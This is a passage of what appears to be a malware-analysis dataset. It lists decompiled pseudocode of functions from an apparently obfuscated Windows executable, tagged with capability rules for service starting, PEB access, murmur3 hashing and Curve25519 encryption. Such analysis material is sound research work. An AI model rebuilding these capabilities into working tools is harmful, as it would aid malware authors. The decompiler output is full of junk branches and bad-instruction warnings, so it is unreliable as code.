iVar9 = (iVar9 - piVar7 & 0xffffU) - 1;\n        }\n        else {\n            out(0xff, uVar3 >> 0x10);\n            *piVar7 = *piVar7 + 1;\n            pcVar1 = iVar9 + -0x77;\n            cVar2 = *pcVar1;\n            *pcVar1 = *pcVar1 + piVar6;\n            if (*pcVar1 != '\\0') {\n                do {\n                } while (*pcVar1 != '\\0' && SCARRY1(cVar2, piVar6) == *pcVar1 < '\\0');\n                return piVar7;\n            }\n        }\n    }\n    else {\n        iVar9 = iVar9 - piVar7;\n    }\n    *arg_14h = iVar9 + arg_ch;\n    *arg_10h = piVar6[0x16];\n    return piVar6;\n}\n",
        "token_count": 782
    },
    "004048a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404934) overlaps instruction at (ram,0x00404932)\n// \n// WARNING: Removing unreachable block (ram,0x00404934)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004048a0(uint lptstrFilename, uint s)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char extraout_DH;\n    uint32_t unaff_EDI;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    float10 extraout_ST0;\n    uint var_22h;\n    uint var_1eh;\n    uint hMem;\n    uint dwLen;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint lpdwHandle;\n    \n    iVar2 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    bVar4 = iVar2 < 0;\n    if (iVar2 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        if ((!bVar4) && (bVar4)) {\n            *(unaff_EDI + 0x1c) = extraout_ST0;\n            unaff_EDI = unaff_EDI + 5;\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        cVar6 = SBORROW1(extraout_DH, '6');\n        cVar5 = extraout_DH + -0x36 < '\\0';\n        uVar1 = sub.VERSION.dll_GetFileVersionInfoA();\n        if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n            *(unaff_EDI | &stack0xfffffffc) = uVar1;\n        }\n        sub.VERSION.dll_VerQueryValueA();\n        (*_sym.imp.MSVCRT.dll_sprintf)\n                  (s, 0x410344, *(var_8h + 0x10) >> 0x10, *(var_8h + 0x10), *(var_8h + 0x14) >> 0x10, *(var_8h + 0x14));\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar3);\n    }\n    return 1;\n}\n",
        "token_count": 520
    },
    "004016f0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016f0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00402210": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402845) overlaps instruction at (ram,0x00402844)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004027cc)\n// WARNING: Removing unreachable block (ram,0x0040271f)\n// WARNING: Removing unreachable block (ram,0x00402845)\n\nuint fcn.00402210(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    uchar *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    uint16_t extraout_DX_01;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    uint32_t extraout_EDX_03;\n    uint *unaff_EBP;\n    uchar *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    ushort in_ES;\n    ushort in_SS;\n    ushort in_DS;\n    bool bVar10;\n    uchar uVar11;\n    bool bVar12;\n    char cVar13;\n    uchar uVar14;\n    char cVar15;\n    uint8_t uVar16;\n    ulong uVar17;\n    uint uStack75;\n    uint uStack71;\n    uint uStack67;\n    uint uStack63;\n    uint uStack59;\n    uint32_t uStack55;\n    ushort uStack51;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uint8_t uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack31;\n    ushort uStack30;\n    uchar uStack28;\n    ushort uStack27;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    uchar uStack20;\n    ushort uStack19;\n    uchar uStack17;\n    uchar uStack16;\n    ushort uStack15;\n    uchar uStack13;\n    \n    bVar10 = false;\n    uStack16 = 10;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0x88;\n    uStack19 = 0x40fe;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x80;\n    uStack27 = 0x41e3;\n    uStack25 = 0;\n    uStack31 = 0x22;\n    uStack30 = 0x40;\n    uVar17 = fcn.004018d0();\n    if (bVar10) {\ncode_r0x0040225d:\n        uStack31 = 0;\n        uStack30 = 0;\n    }\n    else {\n        uStack31 = uVar17 >> 0x28;\n        uStack30 = uVar17 >> 0x30;\n        if (!bVar10) goto code_r0x0040225d;\n        pcVar5 = uVar17 + 0x7c8ecb0d + (bVar10 == false);\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        *pcVar5 = *pcVar5 + '\\x01';\n    }\n    uStack44 = 0x80;\n    uStack43 = 0xe3;\n    uStack42 = 0x41;\n    uStack41 = 0;\n    uStack48 = 0x70;\n    uStack47 = 0x22;\n    uStack46 = 0x40;\n    uStack45 = 0;\n    fcn.004018d0();\n    uStack44 = unaff_EDI;\n    uStack43 = unaff_EDI >> 8;\n    uStack42 = unaff_EDI >> 0x10;\n    uStack41 = unaff_EDI >> 0x18;\n    uStack16 = 4;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0xa8;\n    uStack19 = 0x40fe;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x80;\n    uStack27 = 0x41e3;\n    uStack25 = 0;\n    uStack31 = 0x22;\n    uStack30 = 0x40;\n    fcn.004018d0();\n    uStack16 = 0xc;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0xac;\n    uStack19 = 0x40fe;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x80;\n    uStack27 = 0x41e3;\n    uStack25 = 0;\n    uStack31 = 0x22;\n    uStack30 = 0x40;\n    fcn.004018d0();\n    uStack16 = 7;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0xb8;\n    uStack19 = 0x40fe;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x80;\n    uStack27 = 0x41e3;\n    uStack25 = 0;\n    uStack31 = 0x22;\n    uStack30 = 0x40;\n    fcn.004018d0();\n    uVar11 = extraout_DH < extraout_CL;\n    uStack16 = 0xb;\n    uStack15 = 0;\n    uStack13 = 0;\n    uStack20 = 0xc0;\n    uStack19 = 0x40fe;\n    uStack17 = 0;\n    uStack24 = 0xe;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack28 = 0x80;\n    uStack27 = 0x41e3;\n    uStack25 = 0;\n    uStack31 = 0x23;\n    uStack30 = 0x40;\n    fcn.004018d0();\n    uStack31 = 0xc;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0x3c;\n    uStack46 = 0x23;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    fcn.004018d0();\n    if ((uVar11) || (!uVar11)) {\n        uStack47 = 8;\n        uStack46 = 0;\n        uStack45 = 0;\n        uStack44 = 0;\n        uStack51 = 0xfed8;\n        uStack49 = 0x40;\n        uStack48 = 0;\n        uStack55 = 0xe;\n    }\n    uVar7 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    uVar4 = unaff_EBP + 0x6a76;\n    puVar1 = extraout_EDX + 0xe;\n    bVar10 = CARRY1(*puVar1, extraout_CH);\n    *puVar1 = *puVar1 + extraout_CH;\n    bVar12 = *puVar1 == 0;\n    uStack59 = 0x41e380;\n    uStack63 = 0x402360;\n    fcn.004018d0();\n    if ((!bVar10 && !bVar12) && (bVar10 || bVar12)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uStack63 = 0xd;\n    uStack67 = 0x40fee0;\n    uStack71 = 0xe;\n    uStack75 = 0x41e380;\n    fcn.004018d0();\n    bVar10 = 0xffffffbf < &stack0xffffffb5;\n    uStack15 = 0x18;\n    uStack13 = 0;\n    uStack19 = 0xfef0;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xa5;\n    uStack30 = 0x4023;\n    uStack28 = 0;\n    fcn.004018d0();\n    if (bVar10) {\ncode_r0x004023be:\n        uStack31 = 0x25;\n        uStack30 = 0;\n        uStack28 = 0;\n    }\n    else {\n        uStack31 = extraout_EDX_00;\n        uStack30 = extraout_EDX_00 >> 8;\n        uStack28 = extraout_EDX_00 >> 0x18;\n        if (!bVar10) goto code_r0x004023be;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    *(extraout_EDX_00 + 0xe) = *(extraout_EDX_00 + 0xe) + extraout_CH_00;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0xd1;\n    uStack46 = 0x23;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    fcn.004018d0();\n    uStack15 = 10;\n    uStack13 = 0;\n    uStack19 = 0xff30;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 7;\n    uStack30 = 0x4024;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 0xc;\n    uStack13 = 0;\n    uStack19 = 0xff3c;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x3d;\n    uStack30 = 0x4024;\n    uStack28 = 0;\n    fcn.004018d0();\n    puVar9 = uVar7 & 0xffff0000 | uVar7 & 0xff | (uVar7 >> 8) << 8;\n    uStack15 = 0xd;\n    uStack13 = 0;\n    uStack19 = 0xff48;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x68;\n    uStack30 = 0x4024;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 6;\n    uStack13 = 0;\n    uStack19 = 0xff58;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x93;\n    uStack30 = 0x4024;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 5;\n    uStack13 = 0;\n    uStack19 = 0xff60;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xbf;\n    uStack30 = 0x4024;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 0xd;\n    uStack13 = 0;\n    uStack19 = 0xff68;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xdf;\n    uStack30 = 0x4024;\n    uStack28 = 0;\n    fcn.004018d0();\n    uVar11 = 0;\n    uVar14 = 0;\n    bVar10 = (((uVar4 ^ unaff_ESI) >> 8) - 1U & 0xd) == 0;\n    uStack15 = 0x19;\n    uStack13 = 0;\n    uStack19 = 0xff78;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 6;\n    uStack30 = 0x4025;\n    uStack28 = 0;\n    fcn.004018d0();\n    if ((!bVar10) && (bVar10)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    uStack31 = 0xf;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0x31;\n    uStack46 = 0x25;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    fcn.004018d0();\n    if ((uVar14) || (!uVar14)) {\n        uStack47 = 0xe;\n        uStack51 = 0xffa4;\n        uStack49 = 0x40;\n        uStack48 = 0;\n    }\n    else {\n        uVar14 = in(extraout_DX_00);\n        *puVar9 = uVar14;\n        if (!uVar11 && !bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uStack47 = 0x56;\n        uVar4 = CONCAT11(*extraout_ECX, 0xbc);\n        *0xa4680e6a = *0xa4680e6a + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uStack44 = 0;\n    uStack45 = 0;\n    uStack46 = 0;\n    uStack55 = 0xe;\n    uStack59 = 0x41e380;\n    uStack63 = 0x402568;\n    fcn.004018d0();\n    uStack15 = 0xd;\n    uStack13 = 0;\n    uStack19 = 0xffb4;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x8b;\n    uStack30 = 0x4025;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 0xc;\n    uStack13 = 0;\n    uStack19 = 0xffc4;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 199;\n    uStack30 = 0x4025;\n    uStack28 = 0;\n    uVar2 = fcn.004018d0();\n    bVar10 = (POPCOUNT(((uVar2 ^ 0x3d) + 0x7c28 ^ extraout_DX_01 & 0xff) + 0xbfff & 0xff) & 1U) == 0;\n    uStack15 = 0xf;\n    uStack13 = 0;\n    uStack19 = 0xffd0;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xf4;\n    uStack30 = 0x4025;\n    uStack28 = 0;\n    fcn.004018d0();\n    if ((!bVar10) && (bVar10)) {\n        puVar9 = &stack0xffffffe1;\n        cVar13 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *unaff_EBP;\n            cVar13 = cVar13 + -1;\n        } while ('\\0' < cVar13);\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    uStack31 = 0xb;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0x23;\n    uStack46 = 0x26;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    fcn.004018d0();\n    uStack15 = 0xb;\n    uStack13 = 0;\n    uStack19 = 0xffec;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x57;\n    uStack30 = 0x4026;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 0xb;\n    uStack13 = 0;\n    uStack19 = 0xfff8;\n    uStack17 = 0x40;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x83;\n    uStack30 = 0x4026;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack15 = 10;\n    uStack13 = 0;\n    uStack19 = 4;\n    uStack17 = 0x41;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xb7;\n    uStack30 = 0x4026;\n    uStack28 = 0;\n    fcn.004018d0();\n    uStack43 = SUB41(puVar9, 0);\n    uStack42 = puVar9 >> 8;\n    uStack41 = puVar9 >> 0x10;\n    bVar10 = (POPCOUNT((extraout_ECX_00 & 0xff) - extraout_EDX_01 & 0xff) & 1U) == 0;\n    uStack15 = 0xc;\n    uStack13 = 0;\n    uStack19 = 0x10;\n    uStack17 = 0x41;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xe0;\n    uStack30 = 0x4026;\n    uStack28 = 0;\n    fcn.004018d0();\n    if (!bVar10) {\n        uStack31 = extraout_ECX_01;\n        uStack30 = extraout_ECX_01 >> 8;\n        uStack28 = extraout_ECX_01 >> 0x18;\n        if (bVar10) goto code_r0x004026eb;\n    }\n    uStack31 = 0xe;\n    uStack30 = 0;\n    uStack28 = 0;\ncode_r0x004026eb:\n    *(extraout_EDX_02 + 0xe) = *(extraout_EDX_02 + 0xe) + -0x68;\n    pcVar5 = extraout_EDX_02 + 0xe;\n    cVar13 = extraout_ECX_01 + 1 >> 8;\n    cVar15 = SCARRY1(*pcVar5, cVar13);\n    *pcVar5 = *pcVar5 + cVar13;\n    cVar13 = *pcVar5 < '\\0';\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0xff;\n    uStack46 = 0x26;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    uVar11 = fcn.004018d0();\n    if ((cVar15 == cVar13) && (cVar15 != cVar13)) {\n        in_SS = CONCAT11(uStack42, uStack43);\n        uStack43 = in_ES;\n        uStack42 = in_ES >> 8;\n        puVar8 = puVar9 | unaff_EBP;\n        puVar9 = puVar8 + 1;\n        *puVar8 = uVar11;\n    }\n    uStack47 = 0x11;\n    uStack46 = 0;\n    uStack45 = 0;\n    uStack44 = 0;\n    uStack51 = 0x2c;\n    uStack49 = 0x41;\n    uStack48 = 0;\n    uStack55 = 0xe;\n    uStack59 = 0x41e380;\n    uStack63 = 0x40272d;\n    fcn.004018d0();\n    uStack43 = SUB41(puVar9, 0);\n    uStack42 = puVar9 >> 8;\n    uStack41 = puVar9 >> 0x10;\n    bVar10 = (extraout_ECX_02 & 0xffff0000 | CONCAT11((extraout_ECX_02 >> 8) - uVar4, extraout_ECX_02)) <\n             extraout_EDX_03;\n    uStack15 = 0x13;\n    uStack13 = 0;\n    uStack19 = 0x40;\n    uStack17 = 0x41;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0x56;\n    uStack30 = 0x4027;\n    uStack28 = 0;\n    uVar6 = fcn.004018d0();\n    if ((!bVar10) && (bVar10)) {\n        out(0xbd, uVar6);\n        return uVar6;\n    }\n    uStack31 = 0x14;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0x87;\n    uStack46 = 0x27;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    fcn.004018d0();\n    cVar15 = '\\0';\n    cVar13 = (extraout_DL ^ uVar4 >> 8 | 0x67) < '\\0';\n    uStack15 = 0x33;\n    uStack13 = 0;\n    uStack19 = 0x68;\n    uStack17 = 0x41;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 0xac;\n    uStack30 = 0x4027;\n    uStack28 = 0;\n    uVar11 = fcn.004018d0();\n    if ((cVar15 == cVar13) && (cVar15 != cVar13)) {\n        puVar8 = puVar9 | unaff_EBP;\n        puVar9 = puVar8 + 1;\n        *puVar8 = uVar11;\n        in_SS = uStack27;\n        uStack27 = in_ES;\n    }\n    uStack31 = 10;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0xda;\n    uStack46 = 0x27;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    iVar3 = fcn.004018d0();\n    uVar16 = 0;\n    uVar4 = iVar3 + uVar4 | 0x11a9;\n    uVar2 = uVar4 < 0;\n    bVar10 = uVar4 == 0;\n    uStack15 = 4;\n    uStack13 = 0;\n    uStack19 = 0xa8;\n    uStack17 = 0x41;\n    uStack16 = 0;\n    uStack23 = 0xe;\n    uStack22 = 0;\n    uStack21 = 0;\n    uStack20 = 0;\n    uStack27 = 0xe380;\n    uStack25 = 0x41;\n    uStack24 = 0;\n    uStack31 = 4;\n    uStack30 = 0x4028;\n    uStack28 = 0;\n    fcn.004018d0();\n    if ((!bVar10) && (bVar10)) {\n        uVar16 = ((uVar16 & 1) * 0x800 & 0x800) != 0;\n        uVar2 = (uVar2 * -0x80 | (bVar10 & 1U) * '@' & 0x80) != 0;\n    }\n    uStack31 = 5;\n    uStack30 = 0;\n    uStack28 = 0;\n    uStack43 = 0x80;\n    uStack42 = 0xe3;\n    uStack41 = 0x41;\n    uStack47 = 0x23;\n    uStack46 = 0x28;\n    uStack45 = 0x40;\n    uStack44 = 0;\n    uVar17 = fcn.004018d0();\n    if (uVar16 == uVar2) {\n        uStack45 = uVar17 >> 0x20;\n        uStack44 = uVar17 >> 0x28;\n        if (uVar16 != uVar2) {\n            out(0xc4, uVar17);\n            uStack47 = in_DS;\n            uStack46 = in_DS >> 8;\n            uStack55 = uVar17 >> 0x20 & 0xffffff00 | uStack45 ^ extraout_CL_00;\n            *puVar9 = uVar17;\n            uStack51 = in_SS;\n        }\n    }\n    uStack59 = 6;\n    uStack63 = 0x4100b4;\n    uStack67 = 0xe;\n    uStack71 = 0x41e380;\n    uStack75 = 0x402857;\n    fcn.004018d0();\n    uStack27 = 0xc;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0xbc;\n    uStack30 = 0x4100;\n    uStack28 = 0;\n    uStack43 = 0x82;\n    uStack42 = 0x28;\n    uStack41 = 0x40;\n    fcn.004018d0();\n    uStack27 = 0xc;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 200;\n    uStack30 = 0x4100;\n    uStack28 = 0;\n    uStack43 = 0x9e;\n    uStack42 = 0x28;\n    uStack41 = 0x40;\n    fcn.004018d0();\n    uStack27 = 0x2a;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0;\n    uStack30 = 0x4101;\n    uStack28 = 0;\n    uStack43 = 0xd4;\n    uStack42 = 0x28;\n    uStack41 = 0x40;\n    fcn.004018d0();\n    uStack27 = 0xb;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0x2c;\n    uStack30 = 0x4101;\n    uStack28 = 0;\n    uStack43 = 0xb;\n    uStack42 = 0x29;\n    uStack41 = 0x40;\n    fcn.004018d0();\n    uStack43 = 0x41;\n    uStack42 = 0;\n    uStack41 = 0;\n    uStack47 = 0x88;\n    uStack46 = 1;\n    uStack45 = 0x41;\n    uStack44 = 0;\n    uStack51 = 0xe;\n    uStack49 = 0;\n    uStack48 = 0;\n    uStack55 = 0x41e380;\n    uStack59 = 0x40291e;\n    fcn.004018d0();\n    uStack59 = 0x33;\n    uStack63 = 0x4101cc;\n    uStack67 = 0xe;\n    uStack71 = 0x41e380;\n    uStack75 = 0x402931;\n    fcn.004018d0();\n    uStack75 = 0x4b;\n    fcn.004018d0(0x41e380, 0xe, 0x410200);\n    uStack27 = 0x39;\n    uStack25 = 0;\n    uStack24 = 0;\n    uStack31 = 0x4c;\n    uStack30 = 0x4102;\n    uStack28 = 0;\n    uStack43 = 0x5a;\n    uStack42 = 0x29;\n    uStack41 = 0x40;\n    fcn.004018d0();\n    uStack43 = 8;\n    uStack42 = 0;\n    uStack41 = 0;\n    uStack47 = 0x88;\n    uStack46 = 2;\n    uStack45 = 0x41;\n    uStack44 = 0;\n    uStack51 = 0xe;\n    uStack49 = 0;\n    uStack48 = 0;\n    uStack55 = 0x41e380;\n    uStack59 = 0x40296d;\n    fcn.004018d0();\n    uStack59 = 0x14;\n    uStack63 = 0x410290;\n    uStack67 = 0xe;\n    uStack71 = 0x41e380;\n    uStack75 = 0x402980;\n    uVar6 = fcn.004018d0();\n    return uVar6;\n}\n",
        "token_count": 8018
    },
    "00402f40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402fb0) overlaps instruction at (ram,0x00402faf)\n// \n\nuint __cdecl fcn.00402f40(char *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *unaff_ESI;\n    uint *puVar6;\n    char *pcVar7;\n    uchar var_264h;\n    uint var_263h;\n    int32_t aiStack469 [28];\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar6 = &var_263h;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_160h = '\\0';\n    puVar6 = &var_15fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    if ((arg_ch != 0) && (arg_ch == 0)) {\n        piVar1 = puVar6 + -0x72;\n        *piVar1 = *piVar1 - &stack0xfffffd8c;\n        arg_8h = unaff_ESI;\n        if (*piVar1 != 0) {\n            LOCK();\n            pe_dos_header = pe_dos_header + 